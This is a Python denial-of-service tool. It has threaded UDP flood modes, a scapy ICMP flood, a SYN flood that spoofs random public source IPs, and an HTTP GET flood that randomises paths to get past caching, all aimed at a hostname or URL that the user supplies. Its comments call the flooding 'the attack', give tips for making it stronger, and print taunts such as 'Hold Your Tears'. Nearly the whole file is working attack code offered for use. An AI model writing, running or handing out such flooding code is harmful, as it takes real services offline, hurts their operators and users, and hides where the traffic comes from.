from urllib.parse import urlparse
from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP
import random
import socket
import string
import sys
import threading
import time


# --- 1. UTILITY FUNCTIONS ---

def resolve_to_ipv4(target: str) -> list[str]:
    """
    Resolves a hostname or URL to a list of its unique IPv4 addresses.

    This function is robust and can handle full URLs (e.g., 'https://www.google.com/search')
    and simple hostnames (e.g., 'google.com').

    :param target: The URL or hostname string to resolve.
    :return: A list of unique IPv4 address strings, or an empty list if resolution fails.
    """
    print(f"[*] Resolving '{target}' to IPv4 addresses...")
    try:
        # Prepend a default scheme if one is missing to ensure urlparse works correctly.
        if "://" not in target:
            target = "http://" + target

        # Extract the network location part (e.g., 'www.google.com') from the full URL.
        hostname = urlparse(target).hostname

        if not hostname:
            print(f"[!] Could not parse a valid hostname from '{target}'.")
            return []

        # Get address information from the hostname, filtering for the IPv4 address family.
        addr_info = socket.getaddrinfo(hostname, None, family=socket.AF_INET)

        # The result of getaddrinfo is a list of tuples. The IP is in the 4th element's 0th index.
        # We use a set comprehension for automatic deduplication of IP addresses.
        ips = {item[4][0] for item in addr_info}

        resolved_ips = sorted(list(ips))
        print(f"[*] Successfully resolved '{hostname}' to: {resolved_ips}")
        return resolved_ips

    except socket.gaierror:
        # This error occurs if DNS resolution fails (e.g., the domain doesn't exist).
        print(f"[!] DNS resolution failed for '{hostname}'. It might not exist or be offline.")
        return []
    except Exception as e:
        # Catch any other unexpected errors during resolution.
        print(f"[!] An unexpected error occurred during resolution: {e}")
        return []


# --- 2. UDP FLOOD MODULE ---

def udp_worker(stop_event, packet_size, host, port):
    """
    A worker function that sends UDP packets in a loop until signalled to stop.
    This function is self-contained and thread-safe.
    """
    # 1. Prepare the data payload ONCE before the loop for maximum efficiency.
    #    The payload is just a repeating byte.
    data = b"\x99" * packet_size

    # 2. Create and connect the socket ONCE per thread.
    #    This is crucial for performance and thread safety.
    try:
        # Create a new UDP socket for this specific thread.
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # For UDP, connect() sets the default destination. This is more efficient
        # than specifying the address with sendto() in every loop iteration.
        sock.connect((host, port))
    except socket.error as e:
        # If the socket can't be created or connected, this thread can't do its job.
        # It will print an error and exit gracefully.
        print(f"[Thread Error] Could not connect to {host}:{port}. Reason: {e}")
        return

    # 3. The main sending loop.
    #    This loop is the core of the attack and is controllable by the stop_event.
    while not stop_event.is_set():
        try:
            # Send the pre-compiled data as fast as possible.
            sock.send(data)
        except socket.error:
            # This might happen if the network connection is interrupted.
            # For a flood tool, we can often just ignore it and keep trying.
            pass

    # 4. Clean up the socket when the loop is broken (when stop_event is set).
    sock.close()


def attack_UDP(method, host_url, port, duration, threads_per_method=100):
    """
    Controller function for launching a UDP flood attack for a specific duration.

    :param method: The flood method ("UDP-Flood", "UDP-Power", "UDP-Mix").
    :param host_url: Target URL or hostname.
    :param port: Target port.
    :param duration: How long the attack should run, in seconds.
    :param threads_per_method: Number of concurrent threads to spawn.
    """
    # First, resolve the target URL to one or more IP addresses.
    hosts = resolve_to_ipv4(host_url)
    if not hosts:
        print(f"[!] UDP Attack failed: Could not resolve '{host_url}'.")
        return

    # The attack will be run against each resolved IP address.
    for host in hosts:
        print(f"\n--- Launching UDP Attack: {method} on {host}:{port} for {duration} seconds ---")
        print(f"[*] Spawning {threads_per_method if method != 'UDP-Mix' else threads_per_method * 2} threads...")

        # A threading.Event is a safe way to signal multiple threads to stop.
        stop_event = threading.Event()
        threads = []

        # This is a helper function to avoid repetitive code when launching threads.
        def launch_thread(size):
            # We pass arguments to the thread's target function via the `args` tuple.
            thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
            # Daemon threads will exit automatically when the main program exits.
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Launch threads based on the chosen method.
        if method == "UDP-Flood":
            for _ in range(threads_per_method):
                launch_thread(375)  # Smaller packet size
        elif method == "UDP-Power":
            for _ in range(threads_per_method):
                launch_thread(750)  # Larger packet size
        elif method == "UDP-Mix":
            # For "Mix", we launch threads for both small and large packets.
            for _ in range(threads_per_method):
                launch_thread(375)
                launch_thread(750)
        else:
            print(f"[!] Error: Unknown UDP method '{method}'")
            return

        # Let the threads run for the specified duration. The main thread will block here.
        print(f"[*] Attack in progress... Will stop in {duration} seconds.")
        time.sleep(duration)

        # The timer has expired. Now we signal all worker threads to stop.
        print("\n[*] Timeout reached. Signaling threads to stop...")
        stop_event.set()

        # (Optional but good practice) Wait for all threads to finish their cleanup.
        for thread in threads:
            thread.join()

        print(f"--- UDP Attack '{method}' has finished. ---")


# --- 3. SCAPY-BASED FLOODS (ICMP, SYN, XMAS) ---
# NOTE: To be effective, these floods require running the script with root/administrator privileges.

# Helper function for sending a single ICMP packet.
def attack_icmp_helper(target):
    # Crafts and sends one ICMP "echo-request" packet (a ping).
    send(IP(dst=target) / ICMP(), verbose=0)


def icmpflood(target_url, cycle):
    """Launches a multi-threaded ICMP (Ping) flood."""
    print(f"\n--- Launching ICMP Flood against {target_url} with {cycle} packets ---")
    targets = resolve_to_ipv4(target_url)
    if not targets: return

    all_threads = []
    # Loop for each IP resolved from the target URL.
    for target in targets:
        print(f"[*] Targeting IP: {target}")
        # Launch one thread per packet requested.
        for _ in range(cycle):
            # CORRECTION: `args` must be a tuple, even with one element. Use (target,).
            t = threading.Thread(target=attack_icmp_helper, args=(target,))
            t.start()
            all_threads.append(t)
            # NOTE: This sleep limits the packet rate. For a true flood, remove or reduce it.
            time.sleep(0.01)

    # Wait for all packet-sending threads to complete.
    for t in all_threads:
        t.join()
    print("--- ICMP Flood finished. ---")


# --- MODIFIED SCAPY-BASED FLOODS ---

def generate_random_ip():
    """Generates a random, non-private IP address."""
    # This ensures we don't generate IPs from private ranges (like 192.168.x.x)
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not ip.startswith("10.") and \
                not ip.startswith("192.168.") and \
                not ip.startswith("172.16."):  # Simplified check
            return ip


def attack_synflood_helper(target, targetPort, spoofed_ip):
    """Sends a single TCP SYN packet with a spoofed source IP."""
    # The 'src' parameter in the IP layer sets the source address.
    send(IP(src=spoofed_ip, dst=target) / TCP(dport=targetPort, flags="S", sport=RandShort(), seq=RandShort()),
         verbose=0)


def synflood(target_url, targetPort, cycle):
    """Launches a multi-threaded TCP SYN flood with spoofed source IPs."""
    # This attack requires root/administrator privileges!
    print(f"\n--- Launching SPOOFED SYN Flood against {target_url}:{targetPort} with {cycle} packets ---")
    targets = resolve_to_ipv4(target_url)
    if not targets: return

    all_threads = []
    for target in targets:
        print(f"[*] Targeting IP: {target}")
        for _ in range(cycle):
            # For each packet, generate a new random source IP
            spoofed_source_ip = generate_random_ip()
            t = threading.Thread(target=attack_synflood_helper, args=(target, targetPort, spoofed_source_ip))
            t.start()
            all_threads.append(t)
            time.sleep(0.01)

    print(f"[*] All {cycle} threads launched. Waiting for completion...")
    for t in all_threads:
        t.join()
    print("--- Spoofed SYN Flood finished. ---")


# --- 4. HTTP FLOOD MODULE ---
# This attack works at the application layer, consuming server resources (CPU, RAM).

# CORRECTION: These are moved to the global scope to be properly shared by threads.
# A lock is used to prevent race conditions when multiple threads access the counter.
thread_num_counter = 0
thread_num_mutex = threading.Lock()


def attack_http_flood(target, port, num_of_requests):
    """Controller for launching a multi-threaded HTTP GET flood."""

    # Reset the counter for each new attack.
    global thread_num_counter
    thread_num_counter = 0

    print(f"\n--- Launching HTTP Flood against {target}:{port} with {num_of_requests} requests ---")

    try:
        # For the HTTP host header, we use the original target name.
        host_header = target
        # For the socket connection, we use the resolved IP.
        ip = socket.gethostbyname(target)
        print(f"[*] Resolved '{target}' to {ip} for connection.")
    except socket.gaierror:
        print(f"[!] HTTP Attack failed: Could not resolve '{target}'.")
        return

    print(f"[*] Spawning {num_of_requests} threads...")
    all_threads = []
    for i in range(num_of_requests):
        # Each thread will make one HTTP request.
        t = threading.Thread(target=attack_http_flood_helper, args=(ip, port, host_header))
        t.start()
        all_threads.append(t)
        # This sleep throttles the thread creation rate.
        time.sleep(0.01)

    # Wait for all threads to complete their request.
    for current_thread in all_threads:
        current_thread.join()

    print("\n--- HTTP Flood finished. ---")


def print_status():
    """Thread-safe function to print the request counter."""
    global thread_num_counter
    # The lock ensures that only one thread can modify and print the counter at a time.
    with thread_num_mutex:
        thread_num_counter += 1
        # The '\r' character returns the cursor to the start of the line, creating a dynamic counter effect.
        sys.stdout.write(f"\r[*] Requests sent: {thread_num_counter} / Hold Your Tears... ")
        sys.stdout.flush()


def generate_url_path():
    """Generates a random 5-character string to use as a URL path."""
    # This helps bypass some caching mechanisms, forcing the server to do more work.
    msg = string.ascii_letters + string.digits
    return "".join(random.sample(msg, 5))


def attack_http_flood_helper(ip, port, host_header):
    """Worker function that performs a single HTTP GET request."""
    # First, update the status counter.
    print_status()

    # Generate a random path for this request.
    url_path = generate_url_path()

    # Create a new TCP socket.
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Open the connection to the target IP and port.
        dos.connect((ip, port))

        # Send the HTTP GET request. The f-string constructs a valid HTTP/1.1 request.
        # The 'Host' header is required by most modern web servers.
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host_header}\n\n").encode()
        dos.send(byt)
    except socket.error as e:
        # This will be printed if the server is down or refuses the connection.
        sys.stderr.write(f"\n[!] Connection error on thread: {e}\n")
    finally:
        # Gracefully close the socket connection.
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()